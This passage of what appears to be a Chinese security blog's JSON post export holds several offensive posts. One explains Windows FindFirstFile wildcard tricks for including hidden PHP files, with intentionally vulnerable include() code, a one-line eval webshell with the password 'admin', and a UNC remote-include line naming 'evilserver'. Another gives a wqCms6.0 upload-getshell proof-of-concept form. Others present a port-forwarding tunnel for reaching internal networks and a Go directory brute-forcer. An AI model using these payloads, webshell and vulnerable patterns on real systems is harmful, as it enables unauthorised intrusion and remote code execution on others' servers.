jWQiA4NBEA0Q1RpWxHg4cMXxNDk4OBxNUkPAQAEXDgllKgMzQA1pSYopBgonCj9JEA8REQ8QjY+RQJOVl4ugoYssBJuMpYYjDQSliwasiQOwNakALKqsqbWvIohFm7V6rQAGP6+JQLlFg7KDQLKJrLjBKbvAor3IKiEAIfkECQcAAAAsAAAAABgAGAAABbUgII4koChlmhokw5DEoI4NQ4xFMQoJO4uuhignMiQWvxGBIQC+AJBEUyUcIRiyE6CR0CllW4HABxBURTUw4nC4FcWo5CDBRpQaCoF7VjgsyCUDYDMNZ0mHdwYEBAaGMwwHDg4HDA2KjI4qkJKUiJ6faJkiA4qAKQkRB3E0i6YpAw8RERAjA4tnBoMApCMQDhFTuySKoSKMJAq6rD4GzASiJYtgi6PUcs9Kew0xh7rNJMqIhYchACH5BAkHAAAALAAAAAAYABgAAAW0ICCOJEAQZZo2JIKQxqCOjWCMDDMqxT2LAgELkBMZCoXfyCBQiFwiRsGpku0EshNgUNAtrYPT0GQVNRBWwSKBMp98P24iISgNDAS4ipGA6JUpA2WAhDR4eWM/CAkHBwkIDYcGiTOLjY+FmZkNlCN3eUoLDmwlDW+AAwcODl5bYl8wCVYMDw5UWzBtnAANEQ8kBIM0oAAGPgcREIQnVloAChEOqARjzgAQEbczg8YkWJq8nSUhACH5BAkHAAAALAAAAAAYABgAAAWtICCOJGAYZZoOpKKQqDoORDMKwkgwtiwSBBYAJ2owGL5RgxBziQQMgkwoMkhNqAEDARPSaiMDFdDIiRSFQowMXE8Z6RdpYHWnEAWGPVkajPmARVZMPUkCBQkJBQINgwaFPoeJi4GVlQ2Qc3VJBQcLV0ptfAMJBwdcIl+FYjALQgimoGNWIhAQZA4HXSpLMQ8PIgkOSHxAQhERPw7ASTSFyCMMDqBTJL8tf3y2fCEAIfkECQcAAAAsAAAAABgAGAAABa8gII4k0DRlmg6kYZCoOg5EDBDEaAi2jLO3nEkgkMEIL4BLpBAkVy3hCTAQKGAznM0AFNFGBAbj2cA9jQixcGZAGgECBu/9HnTp+FGjjezJFAwFBQwKe2Z+KoCChHmNjVMqA21nKQwJEJRlbnUFCQlFXlpeCWcGBUACCwlrdw8RKGImBwktdyMQEQciB7oACwcIeA4RVwAODiIGvHQKERAjxyMIB5QlVSTLYLZ0sW8hACH5BAkHAAAALAAAAAAYABgAAAW0ICCOJNA0ZZoOpGGQrDoOBCoSxNgQsQzgMZyIlvOJdi+AS2SoyXrK4umWPM5wNiV0UDUIBNkdoepTfMkA7thIECiyRtUAGq8fm2O4jIBgMBA1eAZ6Knx+gHaJR4QwdCMKBxEJRggFDGgQEREPjjAMBQUKIwIRDhBDC2QNDDEKoEkDoiMHDigICGkJBS2dDA6TAAnAEAkCdQ8ORQcHTAkLcQQODLPMIgIJaCWxJMIkPIoAt3EhACH5BAkHAAAALAAAAAAYABgAAAWtICCOJNA0ZZoOpGGQrDoOBCoSxNgQsQzgMZyIlvOJdi+AS2SoyXrK4umWHM5wNiV0UN3xdLiqr+mENcWpM9TIbrsBkEck8oC0DQqBQGGIz+t3eXtob0ZTPgNrIwQJDgtGAgwCWSIMDg4HiiUIDAxFAAoODwxDBWINCEGdSTQkCQcoegADBaQ6MggHjwAFBZUFCm0HB0kJCUy9bAYHCCPGIwqmRq0jySMGmj6yRiEAIfkECQcAAAAsAAAAABgAGAAABbIgII4k0DRlmg6kYZCsOg4EKhLE2BCxDOAxnIiW84l2L4BLZKipBopW8XRLDkeCiAMyMvQAA+uON4JEIo+vqukkKQ6RhLHplVGN+LyKcXA4Dgx5DWwGDXx+gIKENnqNdzIDaiMECwcFRgQCCowiCAcHCZIlCgICVgSfCEMMnA0CXaU2YSQFoQAKUQMMqjoyAglcAAyBAAIMRUYLCUkFlybDeAYJryLNk6xGNCTQXY0juHghACH5BAkHAAAALAAAAAAYABgAAAWzICCOJNA0ZVoOAmkY5KCSSgSNBDE2hDyLjohClBMNij8RJHIQvZwEVOpIekRQJyJs5AMoHA+GMbE1lnm9EcPhOHRnhpwUl3AsknHDm5RN+v8qCAkHBwkIfw1xBAYNgoSGiIqMgJQifZUjBhAJYj95ewIJCQV7KYpzBAkLLQADCHOtOpY5PgNlAAykAEUsQ1wzCgWdCIdeArczBQVbDJ0NAqyeBb64nQAGArBTt8R8mLuyPyEAOw==\" data-src=\"https://ooo.0o0.ooo/2017/03/07/58beb8f48f7df.png\" alt=\"TIM图片20170307212124.png\" /\u003e\u003c/p\u003e\n","title":"s2-045漏洞批量检测工具"},{"content":"\n\n\n目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。\n\n利用方法很简单，我们只要将文件名不可知部分之后的字符用\"\u003c\"或者\"\u003e\"代替即可，不过要注意一点是，只使用一个\"\u003c\"或者\"\u003e\"则只能代表一个字符，如果文件名是12345或者更长，这时候请求\"1\u003c\"或者\"1\u003e\"都是访问不到文件的，需要\"1\u003c\u003c\"才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。\n\n我们来做个简单的测试，测试代码如下：\n```php\n//1.php\n\n\u003c?php\n\tinclude($_GET['file']);\n ?\u003e\n ```\n 再在同目录下新建一个文件名为\"123456.txt\"的文件，内容为`phpinfo()`函数，请求`/1.php?file=1\u003c\u003c`即可包含。\n ![d8336189e9e8ab752ec855e7ed94a9b7.jpg.png](https://ooo.0o0.ooo/2017/03/04/58ba6a75887a8.png)\n \n # 常用的漏洞代码\n ## 1\n ```php\n\u003c?php\n\tif(isset($_GET[page])) {\n\t\tinclude($_GET[page]);\n\t}else{\n\t\tinclude 'show.php';\n\t}\n?\u003e\n```\n## 2\n```php\n\u003c?php\n\tif(isset($_GET[page])) {\n\t\tinclude('./action/' . $_GET[page]);\n\t}else{\n\t\tinclude './action/show.php';\n\t}\n?\u003e\n```\n## 3\n```php\n\u003c?php\n\tif(isset($_GET[page])) {\n\t\tinclude('./action/'. $_GET[page] . '.php');\n\t}else{\n\t\tinclude './action/show.php';\n\t}\n?\u003e\n```\n# 相关代码：\n1. php中代码：\n```php\n\u003c?php\n\tinclude($_GET['file']);\n?\u003e\n```\n2. 123456.txt中代码：\n```php\n\u003c?php phpinfo() ?\u003e\n```\n3. 123456.TXT里面可以换成一句话木马，代码：\n```php\n\u003c?php eval($_POST[\"admin\"]) ?\u003e\n```\nurl:http://127.0.0.1/1.php?file=12\u003c\u003c\n密码：admin\n**注意**：txt里面书写php代码不能换行写，最好是在同一行书写【原因待查明】\n\n![acccc1eb9b5be30878b4f979f2edadfc.jpg.png](https://ooo.0o0.ooo/2017/03/04/58ba6bd6354d3.png)\n\n# windows的文件系统机制引发的PHP路径爆破问题分析\n\n## 开场白\n\n此次所披露的是以下网页中提出的问题所取得的测试结果：\n\n[http://code.google.com/p/pasc2at/wiki/SimplifiedChinese](http://code.google.com/p/pasc2at/wiki/SimplifiedChinese)\n```php\n\u003c?php\n\tfor ($i=0; $i\u003c255; $i++) {\n\t\t$url = '1.ph' . chr($i);\n\t\t$tmp = @file_get_contents($url);\n\t\tif (!empty($tmp)) echo chr($i) . \" \";\n\t}\n?\u003e\n```\n已知1.php存在，以上脚本访问的结果是：\n```\n1.php\n1.phP\n1.ph\u003c\n1.ph\u003e\n```\n都能得到返回。\n前两种能返回结果是总所周知的（因为windows的文件系统支持大小的互转的机制），另外的两种返回引起了我们的注意。\n\n测试php版本：PHP4.9,PHP5.2,PHP5.3,PHP6.0\n\n测试系统：WINXP SP3 X32,WINXP SP2 X64，WIN7,WIN2K3\n\n经测试我们得出的结论是：**该漏洞影响所有的windows+php版本**\n\n## 深入探查模糊测试的结果\n为了继续深入探查关于该bug的信息，我们对demo做了些许修改:\n```php\n\u003c?php\n\tfor ($j=0; $i\u003c256; $j++) {\n\t\tfor ($i=0; $i\u003c256; $i++) {\n\t\t\t$url = '1.p' . chr($j) . chr($i);\n\t\t\t$tmp = @file_get_contents($url);\n\t\t\tif (!empty($tmp)) echo chr($j) . chr($i) . \" \";\n\t\t}\n\t}\n?\u003e\n```\n\n在调试php解释器的过程中，我们将此“神奇”的漏洞归结为一个Winapi 函数FindFirstFile(）所产生的结果[(http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx)](http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx).更好玩的是，当跟踪函数调用栈的过程中我们发现字符”\u003e”被替换成”?”，字符”\u003c”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。这在2007年msdn公开的文档中被提及：[http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3](http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3)\n\n但是此bug至今未被任何windows旗下所发行的任何版本修复!\n\n我们要阐明的是，该函数FindFirstFile()在php下的运用远远不至于file_get_contents().关于该bug可以利用的函数我们已经列了如下一表：\n\n\n此外，我们还发现该利用也可以被运用到c++中，以下采用来自msdn的例子：\n```cpp\n#include \u003cwindows.h\u003e\n#include \u003ctchar.h\u003e\n#include \u003cstdio.h\u003e\n\nvoid _tmain(int argc, TCHAR *argv[]){\n\tWIN32_FIND_DATA FindFileData;\n\tHANDLE hFind;\n\tif( argc != 2 ){\n\t\t_tprintf(TEXT(\"Usage: %s [target_file] \"), argv[0]);\n\t\treturn;\n\t}\n\n\t_tprintf (TEXT(\"Target file is %s \"), argv[1]);\n\thFind = FindFirstFile(argv[1], \u0026FindFileData);\n\tif (hFind == INVALID_HANDLE_VALUE){\n\t\tprintf (\"FindFirstFile failed (%d) \", GetLastError());\n\t\treturn;\n\t}else{\n\t\t_tprintf (TEXT(\"The first file found is %s \"), FindFileData.cFileName);\n\t\tFindClose(hFind);\n\t}\n}\n```\n当传入参数”c:o\u003c”时，成功访问到boot.ini文件。\n\n## 利用方法总结\n1. 当调用FindFirstFile()函数时，”\u003c”被替换成” * ”,这意味该规则可以使”\u003c”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，**为了确保能够使”\u003c”被替换成”*”,应当采用”\u003c\u003c”**\n```\nEXAMPLE:include(‘shell\u003c');  或者include(‘shell\u003c\u003c');    //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。\n```\n2. 当调用FindFirstFile()函数时，”\u003e”被替换成”?”,这意味这”\u003e”可以替换单个任意字符\n```\nEXAMPLE：include(‘shell.p\u003ep');    //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。\n```\n3. 当调用FindFirstFile()函数时，”””(双引号)被替换成”.”\n```\nEXAMPLE:include(‘shell”php');    //===\u003einclude(‘shell.php');\n```\n4. 如果文件名第一个字符是”.”的话，读取时可以忽略之\n```\nEXAMPLE：fopen(‘.htacess');  //==\u003efopen(‘htacess');   //加上第一点中的利用 ==\u003efopen(‘h\u003c\u003c');\n```\n5. 文件名末尾可以加上一系列的/或者的合集，你也可以在/或者中间加上.字符，只要确保最后一位为”.”\n```\nEXAMPLE：fopen(“config.ini\\.// ///.”);==\u003e  fopen(‘config.ini./..'); ==\u003efopen(‘config.ini/////.')==\u003efopen(‘config.ini…..')   //译者注：此处的利用我不是很理解，有何作用？截断？\n```\n6. 该函数也可以调用以”\\”打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过allow_url_fopen=Off 并最终导致一个RFI（远程文件包含）\n```\nEXAMPLE：include (‘\\evilservershell.php');\n```\n7. 用以下方法还可以切换文件的盘名\n```\ninclude(‘\\.C:myfile.php......D:anotherfile.php');\n```\n8. 选择磁盘命名语法可以用来绕过斜线字符过滤\n```\nfile_get_contents(‘C:boot.ini'); //==\u003e  file_get_contents (‘C:/boot.ini');\n```\n9. 在php的命令行环境下（php.exe）,关于系统保留名文件的利用细节\n```\nEXAMPLE:file_get_contents(‘C:/tmp/con.jpg'); //此举将会无休无止地从CON设备读取0字节，直到遇到eof\n\nEXAMPLE:file_put_contents(‘C:/tmp/con.jpg',chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音\n```\n## 更深入的利用方法\n\n除了以上已经展示的方法，你可以用下面的姿势来绕过WAF或者文件名过滤\n\n请思考该例：\n```php\n\u003c?php\n\tfile_get_contents(\"/images/\".$_GET['a'].\".jpg\");\n\t//or another function from Table 1, i.e. include().\n?\u003e\n```\n\n访问test.php?a=../a\u003c%00\n\n可能出现两种结果\n\n1. Warning: include(/images/../a\u003c) [function.include]: failed to open stream:Invalid argument in。。。\n\n2. Warning: include(/images/../a\u003c) [function.include]: failed to open stream:Permission denied。。\n\n如果是第一种情况，说明不存在a打头的文件，第二种则存在。\n\n    \n此外，有记录显示，有时网站会抛出如下错误：\n```\nWarning: include(/admin_h1d3) [function.include]: failed to open stream: Permission denied..\n```\n这说明该文件夹下存在一个以上以a打头的文件（夹），并且第一个就是admin_h1d3。\n\n## 结论\n\n实验告诉我们，php本身没有那么多的漏洞，我们所看到是：过分的依赖于另一种程序语言（注：如文中的漏洞产自与winapi的一个BUG），并且直接强 制使用，将会导致细微的错误(bug)，并最终造成危害(vul).这样便拓宽了模糊测试的范畴（译者注：并不仅仅去研究web层面，而深入到系统底层），并最终导致IDS，IPS的规则更新。诚然，代码需要保护，需要补丁，需要升级与扩充。但是，这并不是我们真正要去关注的问题。在当下，我认为我们 更谨慎地去书写更多更严厉的过滤规则，正如我们一直在做的一样。任重道远，精益求精。\n\n因为这是基础应用层的问题，所以我们猜想类似的问题可能出现在其他web应用中。于是我们还测试了mysql5,而实验结果表明，mysql5并不存在类似的漏洞。但是我们仍认为：类似的漏洞将会出现在诸如Perl、Python、Ruby等解释性语言上。\n\n## Referer\n\n\u003e PHP application source code audits advanced technology:\n\u003e \n\u003e http://code.google.com/p/pasc2at/wiki/SimplifiedChinese\n\u003e \n\u003e MSDN FindFirstFile Function reference:\n\u003e \n\u003e http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx\n\u003e \n\u003e MSDN comments history:\n\u003e \n\u003e http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3\n\u003e \n\u003e MSDN article «Naming Files, Paths, and Namespaces»:\n\u003e \n\u003e http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx\n\u003e \n\u003e Technet article «Managing Files and Directories»:\n\u003e \n\u003e http://technet.microsoft.com/en-us/library/cc722482.aspx\n\u003e \n\u003e Paper «Technique of quick exploitation of 2blind SQL Injection»:\n\u003e \n\u003e http://www.exploit-db.com/papers/13696/\n\n\n------------------\n\n全文完。\n\n注：该文是2011年底发表的一篇白皮书，至今该bug依然存在。我在几个月前做CUIT的一个CTF时偶遇了一道该bug的利用，当时便是看的此文，当时只是粗粗读了一下，写了一个php的脚本去跑目录。今回闲来无事，翻译整理了一番。\n\n文章转自群友\n\n# 版权声明：\n文章所设计内容包括两部分\n一是法师的书籍《代码审计-企业级web代码安全架构》\n二是来自群友@evil7提供的资料\n以下为资料原文：\n[http://www.169it.com/blog_article/2302639890.html](http://www.169it.com/blog_article/2302639890.html)\n[https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki](https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki)\n","cover":"","link":"2017/03/04/windows-findfirst-exploit.html","preview":"\u003cp\u003e目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。\u003c/p\u003e\n\n\u003cp\u003e利用方法很简单，我们只要将文件名不可知部分之后的字符用\u0026rdquo;\u0026lt;\u0026ldquo;或者\u0026rdquo;\u0026gt;\u0026ldquo;代替即可，不过要注意一点是，只使用一个\u0026rdquo;\u0026lt;\u0026ldquo;或者\u0026rdquo;\u0026gt;\u0026ldquo;则只能代表一个字符，如果文件名是12345或者更长，这时候请求\u0026rdquo;1\u0026lt;\u0026ldquo;或者\u0026rdquo;1\u0026gt;\u0026ldquo;都是访问不到文件的，需要\u0026rdquo;1\u0026lt;\u0026lt;\u0026ldquo;才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。\u003c/p\u003e\n","title":"Windows FindFirstFile利用"},{"content":"\n\n\n2017-02-15发布\n# 一、漏洞利用点\n漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点\n\n# 二、hack it\n![77e968abd5e5cb3e2c4cdfbe620568fa.jpg](https://ooo.0o0.ooo/2017/02/22/58ad9095a4fe5.jpg)\n![7281e4d1334393ddcc1c4926ad0065a8.jpg](https://ooo.0o0.ooo/2017/02/22/58ad8ebcee2cf.jpg)\n# 三、POC\n```html\n\u003chtml\u003e\n    \u003cbody\u003e\n        \u003cform action=\"http://127.0.0.1/admin_UploadDataHandler.ashx\" method=\"POST\"enctype=\"multipart/form-data\"\u003e\n            \u003cinput  type=\"file\" name=\"uploadify\" /\u003e\n            \u003cinput  type=\"text\" name=\"saveFile\" value=\"admin\" /\u003e\n            \u003cinput type=\"submit\" name=\"Upload\" value=\"Submit Query\" /\u003e\n        \u003c/form\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n```\n转自群友论坛文章[wobushou](http://loner.fm/article.php?id=24236)\n","cover":"","link":"2017/02/22/wqcms6.0在iis6的getshell.html","preview":"\u003cp\u003e2017-02-15发布\u003c/p\u003e\n\n\u003ch1\u003e一、漏洞利用点\u003c/h1\u003e\n\n\u003cp\u003e漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点\u003c/p\u003e\n","title":"wqCms6.0在IIS6的Getshell"},{"content":"\n\n\n这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境\n\n# 项目地址\n[ooclab/otunnel](https://github.com/ooclab/otunnel)\n\n# 下载地址(内涵各大平台)\n[http://dl.ooclab.com/otunnel/](http://dl.ooclab.com/otunnel/)\n\n# otunnel 用法\n前提：\n1. 假设 server 的地址为 example.com\n2. 从 client 能连接 server (client 与 server 无需在同一个网络)\n\n**注意**  otunnel 程序可以作为 server 和 client 两种角色（运行参数不同）\n\n## 快速上手\n\n### server\n```bash\n./otunnel listen :10000 -s longlongsecret\n```\n\n### client\n#### 反向代理\n举例：将 client 可以访问的 192.168.1.3:22 映射到 server 上的 10022 端口：\n```bash\n./otunnel connect example.com:10000 -s longlongsecret -t 'r:192.168.1.3:22::10022'\n```\n现在访问 example.com:10022 即等于访问了 client 内网的 192.168.1.3:22\n\n#### 正向代理\n举例：假设 example.com 的 127.0.0.1:3128 服务（你懂得），在 client 运行：\n```bash\n./otunnel connect example.com:10000 -s longlonglongsecret -t 'f::20080:127.0.0.1:3128'\n```\n现在 client 的 20080 端口， 等于访问 example.com 上的 127.0.0.1:3128\n\n## 程序用法\n### -t 格式\n包含多个字段信息，以` : `隔开(为空的字段也不能省略` : `)。\n\n```\n代理类型:本地地址:本地端口:远程地址:远程端口\n```\n\n| 字段 | 含义 |\n| ------------- |:-------------:|\n| 代理类型 | r 表示反向代理; f 表示正向代理 |\n| 本地地址 | IP或域名 |\n| 本地端口 | 整数 |\n| 远程地址 | IP或域名 |\n| 远程端口 | 整数 |\n\n**注意**\n1. `本地地址`或`远程地址`如果为空，表示所有网口\n2. otunnel 命令行可以包含多个`-t`选项，同时指定多条隧道规则\n\n# 特点及优势\notunnel 是一款对称的安全隧道工具。\n\n- 单二进制程序：otunnel 为一个独立的二进制程序，可以作为 server 和 client 端。\n- 支持多操作系统平台：支持GNU/Linux, Unix-like, Mac, Windows，其他如 ddwrt 等 arm 平台。\n- 无需配置文件：命令行使用\n- 对称设计：同时支持 正、反向代理（端口映射）\n-  安全加密：支持 AES 对称加密\n\n![otunnel反向代理图示](https://ooo.0o0.ooo/2017/02/15/58a455a1b0a71.png)\n","cover":"","link":"2017/02/15/otunnel：一个和lcx差不多的端口转发的工具.html","preview":"\u003cp\u003e这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境\u003c/p\u003e\n\n\u003ch1\u003e项目地址\u003c/h1\u003e\n\n\u003cp\u003e\u003ca href=\"https://github.com/ooclab/otunnel\"\u003eooclab/otunnel\u003c/a\u003e\u003c/p\u003e\n","title":"otunnel：一个和lcx差不多的端口转发的工具"},{"content":"\n\n\n以前用Python写过这个工具，前两天看了golang的基础，就想着用这个语言把这个工具重写一遍\n\n先放张图![演示1.gif](https://ooo.0o0.ooo/2017/03/04/58ba4e8c66d38.gif)\n\n\n用法\n```\n    Example : Buster.exe -u=https://www.baidu.com -d=asp.txt -t=5\n    Buster是你的程序名字\n    -u后面填网址参数，格式如上\n    -d选字典\n    -t是线程数\n    当你第一次运行请直接在命令行运行你的程序，什么参数都别加，他会有提示信息告诉你怎么做的\n```\n话不多说，直接上代码，字典采用的以前搜集的一个珍藏的大字典，跑起来可能耗时比较久，文件外链会放在底下\n```Golang\npackage main\n\nimport (\n\t\"bufio\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n\t\"os\"\n\t\"sync\"\n)\n\nvar urls chan string\nvar no404URL = make(chan string)\nvar wg sync.WaitGroup //等待goroutine完成\n\nfunc main() {\n\n\tvar baseURL string\n\tvar dicPath string\n\tvar threadCount int\n\tflag.StringVar(\u0026baseURL, \"u\", \"https://www.baidu.com\", \"website which you want to burst\")\n\tflag.StringVar(\u0026dicPath, \"d\", \"asp.txt\", \"dic which you want to use\")\n\tflag.IntVar(\u0026threadCount, \"t\", 5, \"number of Thread\")\n\tflag.Parse()\n\n\tif len(os.Args) == 1 {\n\t\tfmt.Println(\"------------------------------------\")\n\t\tfmt.Println(\" Author      |       Akkuamn\")\n\t\tfmt.Println(\"------------------------------------\")\n\t\tfmt.Println(\" Update-v1.0 |      2017-02-07\")\n\t\tfmt.Println(\"-------------------------------------\")\n\t\tfmt.Printf(\"\\nUsage : \\n\\tExample : %s -u=https://www.baidu.com -d=asp.txt -t=5\\n\\n\", os.Args[0])\n\t\tfmt.Printf(\"View more help via %s -h\\n\\n\", os.Args[0])\n\t\tlistDic(\"dic\")\n\t} else {\n\t\tdicPath = \"./dic/\" + dicPath\n\t\tstart(baseURL, dicPath, threadCount)\n\t\twg.Wait() //等待goroutine完成\n\t}\n}\n\nfunc start(baseURL string, dicPath string, threadCount int) {\n\n\tdicFile, dicError := os.OpenFile(dicPath, os.O_RDONLY, 0)\n\tif dicError != nil {\n\t\tfmt.Printf(\"\\nOpenFile Error:文件打开出错，请检查字典文件是否存在，或文件名是否准确\\n\")\n\t\treturn\n\t}\n\tdefer dicFile.Close()\n\n\t//把处理后的需要爆破的url全部传到信道urls\n\tReturnBurstURL(dicFile, baseURL)\n\n\t//单独开goroutine从信道no404URL取数据写入文件\n\tgo func() {\n\t\tresultTxt, err := os.OpenFile(\"result.txt\", os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0660)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"OpenFile Error:\" + err.Error())\n\t\t}\n\t\tresultWriter := bufio.NewWriter(resultTxt)\n\t\tdefer resultTxt.Close()\n\t\tfor {\n\t\t\t_, err = resultWriter.WriteString(\u003c-no404URL)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Println(\"resultWriter Error:\" + err.Error())\n\t\t\t}\n\t\t\tresultWriter.Flush()\n\t\t}\n\t}()\n\n\t//并发访问网址并将状态码不为404的网址加入信道no404URL\n\tfor i := 0; i \u003c threadCount; i++ {\n\t\twg.Add(1)\n\t\tgo func(i int) {\n\t\t\tfor len(urls) \u003e 0 {\n\t\t\t\turl := \u003c-urls\n\t\t\t\tstatus := HTTPStatus(url)\n\t\t\t\tfmt.Printf(\"[%d]%s-----%s\\n\", i, status, url)\n\t\t\t\tif status != \"404 Not Found\" {\n\t\t\t\t\tno404URL \u003c- status + \"-----\" + url + \"\\n\"\n\t\t\t\t}\n\t\t\t}\n\t\t\twg.Done()\n\t\t}(i)\n\t}\n}\n\n//返回HTTP访问状态码\nfunc HTTPStatus(url string) (status string) {\n\tclient := http.DefaultClient\n\treqest, err := http.NewRequest(\"HEAD\", url, nil)\n\tif err == nil {\n\t\treqest.Header.Set(\"User-Agent\", \"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0\")\n\t\treqest.Header.Set(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\")\n\t\tresponse, err1 := client.Do(reqest)\n\t\tif err1 != nil {\n\t\t\tfmt.Println(\"HTTPRequest Error:\" + err1.Error())\n\t\t}\n\n\t\tdefer response.Body.Close()\n\t\treturn response.Status\n\t} else {\n\t\tfmt.Println(\"NewRequest Error:\" + err.Error())\n\t\treturn \"400 Bad Request\"\n\t}\n}\n\n//把处理后的需要爆破的url全部传到信道urls\nfunc ReturnBurstURL(fURL *os.File, baseurl string) {\n\tvar urlList []string\n\tallURLTxt := bufio.NewScanner(fURL)\n\tfor allURLTxt.Scan() {\n\t\tnewurl := baseurl + \"/\" + allURLTxt.Text()\n\t\turlList = append(urlList, newurl)\n\t}\n\turls = make(chan string, len(urlList))\n\tfor _, url := range urlList {\n\t\turls \u003c- url\n\t}\n\tfmt.Printf(\"\\n读取字典完成，准备开始，请等待...\\n\")\n}\n\n//罗列出可用字典\nfunc listDic(dicDir string) {\n\tdirList, err := ioutil.ReadDir(dicDir)\n\tif err != nil {\n\t\tfmt.Println(\"ReadDir Error : \" + err.Error() + \"\\n\")\n\t}\n\tfmt.Println(\"Dic you can select : \")\n\tfor _, file := range dirList {\n\t\tfmt.Printf(\"    %s\\n\", file.Name())\n\t}\n}\n```\n\n只编译了win平台下的，如果有需要可以自行编译\n\n**[源码及字典及win程序](http://pan.baidu.com/s/1c2BYT8k)**\n**密码: g1gd**\n","cover":"","link":"2017/02/08/first-practice-for-golang-multithread-website-burster.html","preview":"\u003cp\u003e以前用Python写过这个工具，前两天看了golang的基础，就想着用这个语言把这个工具重写一遍\u003c/p\u003e\n\n\u003cp\u003e先放张图\u003cimg src=\"data:image/gif;base64,R0lGODlhGAAYAPQAAP///wAAAM7Ozvr6+uDg4LCwsOjo6I6OjsjIyJycnNjY2KioqMDAwPLy8nd3d4aGhri4uGlpaQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkHAAAAIf4aQ3JlYXRlZCB3aXRoIGFqYXhsb2FkLmluZm8AIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAGAAYAAAFriAgjiQAQWVaDgr5POSgkoTDjFE0NoQ8iw8HQZQTDQjDn4jhSABhAAOhoTqSDg7qSUQwxEaEwwFhXHhHgzOA1xshxAnfTzotGRaHglJqkJcaVEqCgyoCBQkJBQKDDXQGDYaIioyOgYSXA36XIgYMBWRzXZoKBQUMmil0lgalLSIClgBpO0g+s26nUWddXyoEDIsACq5SsTMMDIECwUdJPw0Mzsu0qHYkw72bBmozIQAh+QQJBwAAACwAAAAAGAAYAAAFsCAgjiTAMGVaDgR5HKQwqKNxIKPjjFCk0KNXC6ATKSI7oAhxWIhezwhENTCQEoeGCdWIPEgzESGxEIgGBWstEW4QCGGAIJEoxGmGt5ZkgCRQQHkGd2CESoeIIwoMBQUMP4cNeQQGDYuNj4iSb5WJnmeGng0CDGaBlIQEJziHk3sABidDAHBgagButSKvAAoyuHuUYHgCkAZqebw0AgLBQyyzNKO3byNuoSS8x8OfwIchACH5BAkHAAAALAAAAAAYABgAAAW4ICCOJIAgZVoOBJkkpDKoo5EI43GMjNPSokXCINKJCI4HcCRIQEQvqIOhGhBHhUTDhGo4diOZyFAoKEQDxra2mAEgjghOpCgz3LTBIxJ5kgwMBShACREHZ1V4Kg1rS44pBAgMDAg/Sw0GBAQGDZGTlY+YmpyPpSQDiqYiDQoCliqZBqkGAgKIS5kEjQ21VwCyp76dBHiNvz+MR74AqSOdVwbQuo+abppo10ssjdkAnc0rf8vgl8YqIQAh+QQJBwAAACwAAAAAGAAYAAAFrCAgjiQgCGVaDgZZFCQxqKNRKGOSjMjR0qLXTyciHA7AkaLACMIAiwOC1iAxCrMToHHYjWQiA4NBEA0Q1RpWxHg4cMXxNDk4OBxNUkPAQAEXDgllKgMzQA1pSYopBgonCj9JEA8REQ8QjY+RQJOVl4ugoYssBJuMpYYjDQSliwasiQOwNakALKqsqbWvIohFm7V6rQAGP6+JQLlFg7KDQLKJrLjBKbvAor3IKiEAIfkECQcAAAAsAAAAABgAGAAABbUgII4koChlmhokw5DEoI4NQ4xFMQoJO4uuhignMiQWvxGBIQC+AJBEUyUcIRiyE6CR0CllW4HABxBURTUw4nC4FcWo5CDBRpQaCoF7VjgsyCUDYDMNZ0mHdwYEBAaGMwwHDg4HDA2KjI4qkJKUiJ6faJkiA4qAKQkRB3E0i6YpAw8RERAjA4tnBoMApCMQDhFTuySKoSKMJAq6rD4GzASiJYtgi6PUcs9Kew0xh7rNJMqIhYchACH5BAkHAAAALAAAAAAYABgAAAW0ICCOJEAQZZo2JIKQxqCOjWCMDDMqxT2LAgELkBMZCoXfyCBQiFwiRsGpku0EshNgUNAtrYPT0GQVNRBWwSKBMp98P24iISgNDAS4ipGA6JUpA2WAhDR4eWM/